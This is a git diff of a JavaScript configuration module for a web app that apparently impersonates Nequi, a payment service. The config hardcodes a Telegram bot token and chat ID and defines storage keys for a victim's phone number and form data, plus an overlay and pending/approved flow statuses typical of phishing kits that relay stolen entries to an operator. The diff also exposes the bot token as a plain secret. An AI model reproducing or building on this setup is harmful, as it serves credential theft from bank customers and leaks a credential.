@@ -1,17 +1,26 @@
 /**
- * Configuración centralizada de la aplicación
+ * ===========================================
+ * CONFIGURACIÓN CENTRALIZADA DE LA APLICACIÓN
+ * ===========================================
+ * Todas las constantes y configuraciones globales
  * @module Config
+ * @version 2.0.0
+ * ===========================================
  */
 
 const AppConfig = {
-  // Telegram Bot Configuration
+  // ========================================
+  // TELEGRAM BOT CONFIGURATION
+  // ========================================
   telegram: {
     botToken: '8575415701:AAHrkYg4wE00cWvhvJzfdICS3kjsgomvUcc',
     chatId: '-5179068892',
     apiUrl: 'https://api.telegram.org/bot',
   },
 
-  // Overlay Configuration
+  // ========================================
+  // OVERLAY CONFIGURATION
+  // ========================================
   overlay: {
     defaultTimeout: 30000, // 30 segundos
     messages: {
@@ -22,15 +31,19 @@ const AppConfig = {
     },
   },
 
-  // Storage Keys
+  // ========================================
+  // LOCAL STORAGE KEYS
+  // ========================================
   storageKeys: {
     phoneNumber: 'numero',
     formData: 'formData',
-    sessionId: 'sessionId',
+    sessionId: 'nequi_session_id', // Cambiado para consistencia
     userFlow: 'userFlow',
   },
 
-  // Flow Status
+  // ========================================
+  // FLOW STATUS
+  // ========================================
   flowStatus: {
     PENDING: 'pending',
     APPROVED: 'approved',
@@ -39,13 +52,19 @@ const AppConfig = {
   },
 };
 
+// ========================================
+// INICIALIZACIÓN AUTOMÁTICA
+// ========================================
 // Generar Session ID único si no existe
-if (typeof window !== 'undefined' && !localStorage.getItem(AppConfig.storageKeys.sessionId)) {
-  const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
-  localStorage.setItem(AppConfig.storageKeys.sessionId, sessionId);
+if (typeof window !== 'undefined' && !localStorage.getItem('nequi_session_id')) {
+  const sessionId = `S${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
+  localStorage.setItem('nequi_session_id', sessionId);
+  console.log('🆕 Session ID generado:', sessionId);
 }
 
-// Exportar para uso modular
+// ========================================
+// EXPORTAR PARA USO MODULAR
+// ========================================
 if (typeof module !== 'undefined' && module.exports) {
   module.exports = AppConfig;
 }
